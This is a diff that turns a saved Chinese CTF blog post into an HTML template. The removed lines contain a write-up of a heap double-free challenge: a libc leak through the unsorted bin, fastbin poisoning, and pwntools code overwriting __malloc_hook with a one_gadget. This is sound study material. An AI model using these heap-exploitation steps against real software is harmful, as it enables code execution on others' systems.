@@ -1,341 +1,36 @@
 <!DOCTYPE html>
-<!-- saved from url=(0096)https://blog.gaoyucan.site/posts/2023%E5%AE%89%E5%BE%BD%E7%9C%81%E8%B5%9Bfree%E5%A4%8D%E7%8E%B0/ -->
-<html lang="zh-cn"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-
+<html lang="en-HK">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="当时这个题目是 0 解了的。这是我第一次做堆相关的题目，当时比赛的时候不给网络，也没有事先准备什么材料，所以比赛的时候一点思路也没有。比赛结束之后参考了一下网上的一些资料问了一下 Lotus ✌ 也算是复现出来了。
-libc 版本问题解决 题目给的 libc 版本为 libc-2.23.so，调试发现直接运行根本不会使用这个版本的 libc ，知道可以 patch 解决，但是感觉胖爷应该有更好的方法，遂去问 Lotus ✌
-废物小高：咋让程序用他附件里给的 libc 版本啊
-废物小高：[不知所措.gif]
-Lotus ✌ : patchelf
-还是 patch 一下吧，从网上找了一篇相关的文章，跟着做了一下
-主要就是下面两句
-patchelf --set-interpreter /home/s1nk/CTF/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so ./double_free patchelf --replace-needed libc.so.6 /home/s1nk/CTF/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so ./double_free 再运行，发现已经用上 libc-2.23.so 了，解决。
-pwndbg&gt; libs LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA Start End Perm Size Offset File 0x555555400000 0x555555401000 r-xp 1000 0 /home/s1nk/CTF/pwn/free/double_free 0x555555601000 0x555555602000 r--p 1000 1000 /home/s1nk/CTF/pwn/free/double_free 0x555555602000 0x555555603000 rw-p 1000 2000 /home/s1nk/CTF/pwn/free/double_free 0x555555603000 0x555555609000 rw-p 6000 4000 /home/s1nk/CTF/pwn/free/double_free 0x7ffff7a0d000 0x7ffff7bcd000 r-xp 1c0000 0 /home/s1nk/CTF/pwn/glibc-all-in-one/libs/2.">
+
+    <meta name="description" content="{{ description }}">
 
     <title>
-
-        2023安徽省赛free复现
-
+        {{ title }}
     </title>
-
-
-    <link rel="shortcut icon" type="image/x-icon" href="https://blog.gaoyucan.site/">
-
-
-
-    <link rel="stylesheet" href="./2023安徽省赛free复现_files/main.54709961e72259b29ef9cdf042526617ba749da16a83515a0a139956d05d029e6e2139efb7b1cc6740a929adc11ea5da26144d45acc3d60c9f8dfd69855e427f.css" >
-
+    <link rel="stylesheet" href="../static/css/blog_post.css">
 </head>
 <body a="auto">
 <main class="page-content" aria-label="Content">
     <div class="w">
-        <a href="https://blog.gaoyucan.site/">..</a>
+        <a href="../">..</a>
 
 
         <article>
             <p class="post-meta">
-                <time datetime="2023-10-16 13:52:12 +0800 CST">
-                    2023-10-16
+                <time>
+                    {{ time }}
                 </time>
             </p>
 
-            <h1>2023安徽省赛free复现</h1>
-
-
-
-            <p>当时这个题目是 0 解了的。这是我第一次做堆相关的题目，当时比赛的时候不给网络，也没有事先准备什么材料，所以比赛的时候一点思路也没有。比赛结束之后参考了一下网上的一些资料问了一下 Lotus ✌ 也算是复现出来了。</p>
-            <h3 id="libc-版本问题解决"><code>libc</code> 版本问题解决</h3>
-            <p>题目给的 <code>libc </code>版本为 <code>libc-2.23.so</code>，调试发现直接运行根本不会使用这个版本的 <code>libc</code> ，知道可以 patch 解决，但是感觉胖爷应该有更好的方法，遂去问 Lotus ✌</p>
-            <blockquote>
-                <p>废物小高：咋让程序用他附件里给的 libc 版本啊</p>
-                <p>废物小高：[不知所措.gif]</p>
-                <p>Lotus ✌ :  patchelf</p>
-            </blockquote>
-            <p>还是 patch 一下吧，从网上找了一篇相关的文章，跟着做了一下</p>
-            <p>主要就是下面两句</p>
-            <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>patchelf --set-interpreter /home/s1nk/CTF/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so ./double_free
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>patchelf --replace-needed libc.so.6 /home/s1nk/CTF/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so ./double_free
-</span></span></code></pre></div><p>再运行，发现已经用上 <code>libc-2.23.so</code> 了，解决。</p>
-            <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>pwndbg&gt; libs
-</span></span><span style="display:flex;"><span>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
-</span></span><span style="display:flex;"><span>             Start                End Perm     Size Offset File
-</span></span><span style="display:flex;"><span>    0x555555400000     0x555555401000 r-xp     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /home/s1nk/CTF/pwn/free/double_free
-</span></span><span style="display:flex;"><span>    0x555555601000     0x555555602000 r--p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">1000</span> /home/s1nk/CTF/pwn/free/double_free
-</span></span><span style="display:flex;"><span>    0x555555602000     0x555555603000 rw-p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">2000</span> /home/s1nk/CTF/pwn/free/double_free
-</span></span><span style="display:flex;"><span>    0x555555603000     0x555555609000 rw-p     <span style="color:#ae81ff">6000</span>   <span style="color:#ae81ff">4000</span> /home/s1nk/CTF/pwn/free/double_free
-</span></span><span style="display:flex;"><span>    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000      <span style="color:#ae81ff">0</span> /home/s1nk/CTF/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so
-</span></span><span style="display:flex;"><span>    0x7ffff7bcd000     0x7ffff7dcd000 ---p   <span style="color:#ae81ff">200000</span> 1c0000 /home/s1nk/CTF/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so
-</span></span><span style="display:flex;"><span>    0x7ffff7dcd000     0x7ffff7dd1000 r--p     <span style="color:#ae81ff">4000</span> 1c0000 /home/s1nk/CTF/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so
-</span></span><span style="display:flex;"><span>    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     <span style="color:#ae81ff">2000</span> 1c4000 /home/s1nk/CTF/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so
-</span></span><span style="display:flex;"><span>    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     <span style="color:#ae81ff">4000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffff7dd3<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    <span style="color:#ae81ff">26000</span>      <span style="color:#ae81ff">0</span> /home/s1nk/CTF/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so
-</span></span><span style="display:flex;"><span>    0x7ffff7ff3000     0x7ffff7ff6000 rw-p     <span style="color:#ae81ff">3000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffff7ff3<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>    0x7ffff7ff6000     0x7ffff7ffa000 r--p     <span style="color:#ae81ff">4000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>vvar<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     <span style="color:#ae81ff">2000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>vdso<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>    0x7ffff7ffc000     0x7ffff7ffd000 r--p     <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">25000</span> /home/s1nk/CTF/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so
-</span></span><span style="display:flex;"><span>    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">26000</span> /home/s1nk/CTF/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so
-</span></span><span style="display:flex;"><span>    0x7ffff7ffe000     0x7ffff7fff000 rw-p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffff7ffe<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>    0x7ffffffde000     0x7ffffffff000 rw-p    <span style="color:#ae81ff">21000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>stack<span style="color:#f92672">]</span>
-</span></span></code></pre></div><p>本部分主要参考：</p>
-            <p><a href="https://www.cnblogs.com/xshhc/p/16777707.html">1. 利用 patchelf 修改 pwn 题目的 libc</a></p>
-            <h3 id="利用">利用</h3>
-            <p>题目的名字是 <code>free</code> ，附件的名字是 <code>double_free</code>，不难让人想到题目利用的主要漏洞是 <code>double free</code>。从网上找了一些相关的材料，结合自己逆向分析的结果，最初确定思路大概就是</p>
-            <ul>
-                <li>利用unsorted bin 的特性泄露 <code>libc</code> 基地址</li>
-                <li>利用 double free 实现 <code>UAF</code> 然后控制 <code>fd</code> 指针到 <code>__malloc_hook</code> 最终实现修改 <code>__malloc_hook</code> 为 <code>one_gadget</code></li>
-            </ul>
-            <h4 id="利用-unsorted-bin-的特性泄露-libc基地址">利用 unsorted bin 的特性泄露 <code>libc</code>基地址</h4>
-            <p><code>unsorted bin</code> 在管理时为循环双向链表，在该链表中必有一个节点（不准确的说，是尾节点，这个就意会一下把，毕竟循环链表实际上没有头尾）的 <code>fd</code> 指针会指向 <code>main_arena</code> 结构体内部。</p>
-            <p>可以通过 <code>UAF</code> 泄露 <code>fd</code> 指针，拿到一个与 <code>main_arena</code> 有固定偏移的地址，而<code>main_arena</code> 是 <code>libc</code>中的一个全局变量，它相对于<code>libc</code>基地址的偏移量是固定的可以通过调试得到，以获取<code>libc</code>基地址。</p>
-            <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; bins
-</span></span><span style="display:flex;"><span>fastbins
-</span></span><span style="display:flex;"><span>empty
-</span></span><span style="display:flex;"><span>unsortedbin
-</span></span><span style="display:flex;"><span>all: 0x555555609000 —▸ 0x7ffff7dd1b78 <span style="color:#f92672">(</span>main_arena+88<span style="color:#f92672">)</span> ◂— 0x555555609000
-</span></span><span style="display:flex;"><span>smallbins
-</span></span><span style="display:flex;"><span>empty
-</span></span><span style="display:flex;"><span>largebins
-</span></span><span style="display:flex;"><span>empty
-</span></span><span style="display:flex;"><span>pwndbg&gt; vmmap libc-2.23.so
-</span></span><span style="display:flex;"><span>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
-</span></span><span style="display:flex;"><span>             Start                End Perm     Size Offset File
-</span></span><span style="display:flex;"><span>    0x555555609000     0x55555562a000 rw-p    <span style="color:#ae81ff">21000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>heap<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>►   0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000      <span style="color:#ae81ff">0</span> /home/s1nk/CTF/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so
-</span></span><span style="display:flex;"><span>►   0x7ffff7bcd000     0x7ffff7dcd000 ---p   <span style="color:#ae81ff">200000</span> 1c0000 /home/s1nk/CTF/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so
-</span></span><span style="display:flex;"><span>►   0x7ffff7bcd000     0x7ffff7dcd000 ---p   <span style="color:#ae81ff">200000</span> 1c0000 /home/s1nk/CTF/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so
-</span></span><span style="display:flex;"><span>►   0x7ffff7dcd000     0x7ffff7dd1000 r--p     <span style="color:#ae81ff">4000</span> 1c0000 /home/s1nk/CTF/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so
-</span></span><span style="display:flex;"><span>►   0x7ffff7dcd000     0x7ffff7dd1000 r--p     <span style="color:#ae81ff">4000</span> 1c0000 /home/s1nk/CTF/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so
-</span></span><span style="display:flex;"><span>►   0x7ffff7dd1000     0x7ffff7dd3000 rw-p     <span style="color:#ae81ff">2000</span> 1c4000 /home/s1nk/CTF/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so
-</span></span><span style="display:flex;"><span>►   0x7ffff7dd1000     0x7ffff7dd3000 rw-p     <span style="color:#ae81ff">2000</span> 1c4000 /home/s1nk/CTF/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so
-</span></span><span style="display:flex;"><span>    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     <span style="color:#ae81ff">4000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffff7dd3<span style="color:#f92672">]</span>
-</span></span></code></pre></div><p>所以，偏移量 offset = 0x7ffff7dd1b78 - 0x7ffff7a0d000 = 3951480</p>
-            <p>泄露过程如下：</p>
-            <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># leak libc base</span>
-</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x100</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">'1'</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x100</span>)
-</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">'1'</span>) <span style="color:#75715e"># 防止 unsorted 的那个chunk 和 top chunk 紧邻</span>
-</span></span><span style="display:flex;"><span>delete(<span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>show(<span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> sh<span style="color:#f92672">.</span>recvline(keepends<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">'</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">'</span>)
-</span></span><span style="display:flex;"><span>libc_addr <span style="color:#f92672">=</span> u64(r) <span style="color:#f92672">-</span> <span style="color:#ae81ff">3951480</span>
-</span></span><span style="display:flex;"><span>print(hex(libc_addr))
-</span></span></code></pre></div><blockquote>
-            <p>完整代码见后文</p>
-        </blockquote>
-            <h4 id="double-free">double free</h4>
-            <p>fastbin double free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次,这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块。</p>
-            <p>所以，当我们执行如下操作后，chunk#2 就会在 fastbin 中出现两次</p>
-            <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># double free</span>
-</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">'1'</span>) <span style="color:#75715e"># 2</span>
-</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">'1'</span>) <span style="color:#75715e"># 3</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>delete(<span style="color:#ae81ff">2</span>)
-</span></span><span style="display:flex;"><span>delete(<span style="color:#ae81ff">3</span>)
-</span></span><span style="display:flex;"><span>delete(<span style="color:#ae81ff">2</span>)
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; fastbins
-</span></span><span style="display:flex;"><span>fastbins
-</span></span><span style="display:flex;"><span>0x70: 0x5565b2328000 —▸ 0x5565b2328070 ◂— 0x5565b2328000
-</span></span></code></pre></div><p>也就是上面的 <code>0x5565b2328000</code>，此时我们就可以通过 <code>alloc(0x60, p64(evil_chunk)) # 4</code>，设置 <code>0x5565b2328000</code> 地址这个 <code>chunk</code> 的 <code>fd</code> 为指定地址。</p>
-            <p>比如下图中，就是设置成了 <code>0x7f9f2e9bbaed</code></p>
-            <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; fastbins
-</span></span><span style="display:flex;"><span>fastbins
-</span></span><span style="display:flex;"><span>0x70: 0x5565b2328070 —▸ 0x5565b2328000 —▸ 0x7f9f2e9bbaed <span style="color:#f92672">(</span>_IO_wide_data_0+301<span style="color:#f92672">)</span> ◂— 0x9f2e67cea0000000
-</span></span></code></pre></div><p>只要控制 <code>fd</code> 的值指向 <code>__malloc_hook</code> 地址的前面一点，就可以实现对 <code>__malloc_hook</code> 的控制</p>
-            <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>pwndbg&gt; x/10gx &amp;__malloc_hook
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbb10 &lt;__malloc_hook&gt;: 0x0000000000000000      0x0000000000000000
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbb20 &lt;main_arena&gt;:    0x0000000000000000      0x0000000000000000
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbb30 &lt;main_arena+16&gt;: 0x0000000000000000      0x0000000000000000
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbb40 &lt;main_arena+32&gt;: 0x0000000000000000      0x0000000000000000
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbb50 &lt;main_arena+48&gt;: 0x00005565b2328070      0x0000000000000000
-</span></span><span style="display:flex;"><span>pwndbg&gt; x/10gx <span style="color:#f92672">((</span>long long<span style="color:#f92672">)</span>&amp;__malloc_hook - 0x30<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbae0 &lt;_IO_wide_data_0+288&gt;:   0x0000000000000000      0x0000000000000000
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbaf0 &lt;_IO_wide_data_0+304&gt;:   0x00007f9f2e9ba260      0x0000000000000000
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbb00 &lt;__memalign_hook&gt;:       0x00007f9f2e67cea0      0x00007f9f2e67ca70
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbb10 &lt;__malloc_hook&gt;: 0x0000000000000000      0x0000000000000000
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbb20 &lt;main_arena&gt;:    0x0000000000000000      0x0000000000000000
-</span></span><span style="display:flex;"><span>pwndbg&gt; x/64bx <span style="color:#f92672">((</span>long long<span style="color:#f92672">)</span>&amp;__malloc_hook - 0x30<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbae0 &lt;_IO_wide_data_0+288&gt;:   0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbae8 &lt;_IO_wide_data_0+296&gt;:   0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbaf0 &lt;_IO_wide_data_0+304&gt;:   0x60    0xa2    0x9b    0x2e    0x9f    0x7f    0x00    0x00
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbaf8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbb00 &lt;__memalign_hook&gt;:       0xa0    0xce    0x67    0x2e    0x9f    0x7f    0x00    0x00
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbb08 &lt;__realloc_hook&gt;:        0x70    0xca    0x67    0x2e    0x9f    0x7f    0x00    0x00
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbb10 &lt;__malloc_hook&gt;: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbb18: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
-</span></span></code></pre></div><p>为了满足chunk 的 size 字段，这里需要取  <code>&amp;__malloc_hook - 0x23</code></p>
-            <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>pwndbg&gt; x/10gx <span style="color:#f92672">((</span>long long<span style="color:#f92672">)</span>&amp;__malloc_hook - 0x23<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbaed &lt;_IO_wide_data_0+301&gt;:   0x9f2e9ba260000000      <span style="color:#e6db74">`</span>0x000000000000007f<span style="color:#e6db74">`</span>
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbafd: 0x9f2e67cea0000000      0x9f2e67ca7000007f
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbb0d &lt;__realloc_hook+5&gt;:      0x000000000000007f      0x0000000000000000
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbb1d: 0x0000000000000000      0x0000000000000000
-</span></span><span style="display:flex;"><span>0x7f9f2e9bbb2d &lt;main_arena+13&gt;: 0x0000000000000000      0x0000000000000000
-</span></span></code></pre></div><p>此时，size 字段为 <code>0x7f</code> 刚好可以过这个检查</p>
-            <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 根据取得的 victim ，利用 chunksize 计算其大小。
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 利用fastbin_index 计算 chunk 的索引。
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">__builtin_expect</span>(<span style="color:#a6e22e">fastbin_index</span>(<span style="color:#a6e22e">chunksize</span>(victim)) <span style="color:#f92672">!=</span> idx, <span style="color:#ae81ff">0</span>)) {
-</span></span><span style="display:flex;"><span>    errstr <span style="color:#f92672">=</span> <span style="color:#e6db74">"malloc(): memory corruption (fast)"</span>;
-</span></span></code></pre></div><p>使用工具查找 <code>libc</code> 中的 one_gadget</p>
-            <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>➜  free one_gadget libc-2.23.so
-</span></span><span style="display:flex;"><span>0x45226 execve<span style="color:#f92672">(</span><span style="color:#e6db74">"/bin/sh"</span>, rsp+0x30, environ<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>constraints:
-</span></span><span style="display:flex;"><span>  rax <span style="color:#f92672">==</span> NULL
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>0x4527a execve<span style="color:#f92672">(</span><span style="color:#e6db74">"/bin/sh"</span>, rsp+0x30, environ<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>constraints:
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>rsp+0x30<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>0xf0364 execve<span style="color:#f92672">(</span><span style="color:#e6db74">"/bin/sh"</span>, rsp+0x50, environ<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>constraints:
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>rsp+0x50<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>0xf1207 execve<span style="color:#f92672">(</span><span style="color:#e6db74">"/bin/sh"</span>, rsp+0x70, environ<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>constraints:
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>rsp+0x70<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL
-</span></span></code></pre></div><p>所以利用方法为</p>
-            <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># leak libc base</span>
-</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x100</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">'1'</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x100</span>)
-</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">'1'</span>) <span style="color:#75715e"># 防止 unsorted 的那个chunk 和 top chunk 紧邻</span>
-</span></span><span style="display:flex;"><span>delete(<span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>show(<span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> sh<span style="color:#f92672">.</span>recvline(keepends<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">'</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">'</span>)
-</span></span><span style="display:flex;"><span>libc_addr <span style="color:#f92672">=</span> u64(r) <span style="color:#f92672">-</span> <span style="color:#ae81ff">3951480</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(hex(libc_addr))</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>__malloc_hook <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">'__malloc_hook'</span>] <span style="color:#f92672">+</span> libc_addr
-</span></span><span style="display:flex;"><span>ogg <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4527a</span> <span style="color:#f92672">+</span> libc_addr
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>evil_chunk <span style="color:#f92672">=</span> __malloc_hook <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x23</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># double free</span>
-</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">'1'</span>) <span style="color:#75715e"># 2</span>
-</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">'1'</span>) <span style="color:#75715e"># 3</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>delete(<span style="color:#ae81ff">2</span>)
-</span></span><span style="display:flex;"><span>delete(<span style="color:#ae81ff">3</span>)
-</span></span><span style="display:flex;"><span>delete(<span style="color:#ae81ff">2</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x60</span>, p64(evil_chunk)) <span style="color:#75715e"># 4</span>
-</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">'1'</span>) <span style="color:#75715e"># 5</span>
-</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x60</span>, p64(evil_chunk)) <span style="color:#75715e"># 6</span>
-</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">'a'</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">'a'</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x3</span> <span style="color:#f92672">+</span> p64(ogg)) <span style="color:#75715e"># 6</span>
-</span></span></code></pre></div><p>此时，<code>__malloc_hook</code>指向 <code>one_gadget</code>，如果顺利的话，下次 <code>malloc</code> 就会触发  <code>one_gadget</code> 进而实现 <code>get_shell</code>。但是事与愿违，试了所有的 <code>one_gadget</code> 发现都不符合条件，害。</p>
-            <p>本部分主要参考：</p>
-            <p><a href="https://xz.aliyun.com/t/6342">1. pwn学习系列之double free</a></p>
-            <p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/">2. Unsorted Bin Attack - CTF Wiki</a></p>
